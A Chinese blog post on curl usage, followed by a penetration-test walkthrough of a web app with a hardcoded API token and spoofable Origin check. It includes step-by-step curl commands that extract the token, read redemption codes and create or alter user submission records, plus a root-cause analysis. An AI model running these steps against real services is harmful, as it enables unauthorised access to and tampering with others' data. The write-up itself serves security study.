---
title: curl 命令行工具
date: 2026-10-28 13:00:00
categories:
  - [技术, 安全]
tags: [安全, 渗透测试, curl, 越权]
---

curl是一个强大的命令行工具，用于在各种协议（如HTTP、HTTPS、FTP等）上进行数据传输。它广泛应用于开发、测试和系统管理中。本文将深入探讨curl的基本用法、高级功能以及一些最佳实践。

## 一、基本用法

```bash
curl -I http://example.com                 # 选项可以仅显示HTTP响应头
curl -L http://example.com                 # 选项可以自动跟随HTTP重定向
curl -o output.html http://example.com     # 选项可以将输出保存到指定文件
curl -s http://example.com                 # 选项可以静默输出，不显示进度条和错误信息
```

```bash
$ curl -i https://www.example.com

HTTP/2 301
server: AkamaiGHost
content-length: 0
location: https://www.example.com
date: Sun, 01 Nov 2026 06:19:13 GMT
server-timing: cdn-cache; desc=HIT
server-timing: edge; dur=1
set-cookie: _abck=…（值已省略）
set-cookie: bm_sz=…（值已省略）
Path=/; Expires=Mon, 01 Nov 2027 06:19:13 GMT; Max-Age=31536000; Secure; Domain=.example.com
```

```bash
# 选项可以发送POST请求
curl -d "param1=value1&param2=value2" -X POST http://example.com/api

# 选项可以设置自定义请求头
curl -H "Content-Type: application/json" -X POST -d '{"key":"value"}' http://example.com/api

# 选项可以指定代理服务器
curl -x http://proxy.example.com:8080 http://example.com

# 选项可以上传文件
curl -F "file=@/path/to/file.txt" http://example.com/upload

# 选项可以发送Cookie
curl -b "name=value" http://example.com

# 选项可以将服务器返回的Cookie保存到文件
curl -c cookies.txt http://example.com

# 选项可以忽略SSL证书验证
curl -k https://example.com

# 选项可以指定自签名证书
curl --cacert /path/to/cert.pem https://example.com

# 选项可以显示详细的请求和响应信息
curl -v http://example.com

# 选项可以格式化输出，显示自定义信息
curl -w "Status: %{http_code}\n" http://example.com

# 选项可以指定HTTP请求方法（如GET、POST、PUT、DELETE等）
curl -X POST http://example.com/api

# 选项可以进行HTTP基本认证
curl -u username:password http://example.com

```

## 二、实践

这里以模拟真实环境的本地靶场做测试：

描述：

Next.js 前端 chunk 内硬编码共享 API Token(NTUwZTg0MDAt...NDQwMDAw)，服务端唯一的访问控制是可任意伪造成 "Origin: https://www.example.com" 的 CORS 白名单；带上这两个头即可未认证调用全部业务 API——读取 42 个活动的完整配置（含 claim.codes 兑换码 xxxxxx）、读取/新增/修改 业务 报名提交记录。

### 1. 匿名下载前端 chunk，提取硬编码 Token

```bash
curl -sk "https://www.example.com/_next/static/chunks/14eb39597c3e1bb7.js" -o 14eb.js

grep -o 'NTUwZTg0MDAtZTI5Yi00MWQ0LWE3MTYtNDQ2NjU1NDQwMDAw' 14eb.js
```

![curl 下载 chunk 后用 grep 提取 Token](/img/posts/curl/02-chunk.webp)

JS 中的封装（原文）：

```
let n=async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},
  r="NTUwZTg0MDAtZTI5Yi00MWQ0LWE3MTYtNDQ2NjU1NDQwMDAw";
if(!r)throw Error("API token not configured");
let n={Authorization:"Bearer ".concat(r),...t.headers};
return t.body instanceof FormData||(n["Content-Type"]="application/json"),
  fetch(e,{...t,headers:n})},
o={get:async e=>{let t=await n("/api/".concat(e));...},
   post:..., put:..., patch:..., delete:...}
```

### 2. 验证 Origin 白名单可伪造

```bash
T='NTUwZTg0MDAtZTI5Yi00MWQ0LWE3MTYtNDQ2NjU1NDQwMDAw'
for O in '' 'https://evil.example' 'https://www.example.com.evil.example' \
         'http://www.example.com' 'null' 'https://www.example.com.cn'; do
  echo -n "Origin=[$O] -> "
  curl -sk -o /dev/null -w "%{http_code}\n" -H "Origin: $O" -H "Authorization: Bearer $T" \
    "https://www.example.example.com/api/offers"
done
```

### 3. **匿名读取活动与兑换码**

```bash
curl -sk --compressed -H 'Origin: https://www.example.com' \
     -H "Authorization: Bearer $T" \
     "https://www.example.example.com/api/offers" | head -c 400
```

得到：

```
offers 42
- moto_2025_001   claim: {"codes": ["PG38C07165","PG38C06071","PG38C07182","PG38C06279","PG38C06281"], "name":"Bundle Offer"}
- moto_urus_gb    claim: {"codes": ["PG38C08026","PG38C08264","PG38C08061"], ...}
- moto_merlin_gb  claim: {"codes": ["PG38C08254","PG38C08162"], ...}
- moto_terrain_es claim: {"codes": ["PG38C06071","PG38C06632"], ...}
- moto_razr_fold_or_razr_70_ultra_gb_giffgaff claim: {"codes": ["PG38C05748","PG38C06059"], ...}
...（共 42 条，字段含 _id/offerId/countries/eligibleDevices/purchasePeriod/claimPeriod/status）
```

### 4. **写入并篡改 业务 报名记录**

```bash
H=(-H 'Origin: https://www.example.com' -H "Authorization: Bearer $T" -H 'Content-Type: application/json')
# 新建
curl -sk --compressed "${H[@]}" -X POST -d '{"personalDetails":[{"firstName":"Probe","lastName":"I167","email":"probe-i167@example.com","phone":"0000000000"}],"formStatus":"COMPLETE"}' \
  "https://www.example.example.com/api/fifa/submissions?country=gb&language=en"
# 覆盖（把上一步返回的 _id 填入）
ID=<返回的 _id>
curl -sk --compressed "${H[@]}" -X PUT -d '{"personalDetails":[{"firstName":"Modified","lastName":"ByProbe","email":"probe-i167@example.com","phone":"111"}],"marketingOptIn":true}' \
  "https://www.example.example.com/api/fifa/submissions/$ID?country=gb&language=en"
```

### 5. **按“唯一码”读取报名信息**

```bash
curl -sk --compressed -H 'Origin: https://www.example.com' -H "Authorization: Bearer $T" \
  "https://www.example.example.com/api/fifa/submissions/by-token/PROBE167TOKEN?country=gb&language=en"
```

得到：

```
GET /api/fifa/submissions/by-token/PROBE167TOKEN?country=gb&language=en -> 200 425
[{"_id":"b761146e-...","personalDetails":[{"firstName":"Probe",...,"email":"probe-i167@example.com"}],
  "country":"gb","gameSelection":{...},"marketingOptIn":false}]
```

### 漏洞分析：

**根因分析**

1. **把“密钥”放进了客户端**：为了免去用户登录，开发把服务端 API 的长期共享凭据（550e8400-... 形态的静态 Token）硬编码进 Next.js 打包产物，前端以 Authorization: Bearer 固定携带。任何拿到 JS 的人即拥有与合法前端完全相同的 API 权限，Token 无法轮换、无法区分用户，也无法审计到人。
2. **把“来源校验”当成“访问控制”**：服务端仅检查 Origin 头是否等于两个固定字符串。Origin 是客户端可任意设置的自定义请求头，不是身份凭证；该逻辑只能防简单的浏览器跨站调用，对 curl/脚本完全无效（实测伪造 Origin: https://www.example.com 即放行）。
3. **Function-level 与 Object-level 鉴权双重缺失**：/api/offers、/api/offers/{id}、/api/fifa/submissions/{id}、/api/fifa/submissions/by-token/{token} 既不要求用户会话，也不校验记录归属（无 owner 校验、userId 由服务端自派生且无人绑定），属于典型的 Broken Function Level Authorization + BOLA/IDOR。写接口 POST/PUT 同理，且不做必填与业务状态校验（POST /api/redemptions {} 即成功）。
4. **服务端合并集合路由（/api/[collection]）转发了过多能力**：白名单内集合（offers / redemptions / fifa/submissions / Redemption_translations / formConstants / sendFifaEmail / upload-file）全部对匿名者开放，安全边界完全依赖前端。
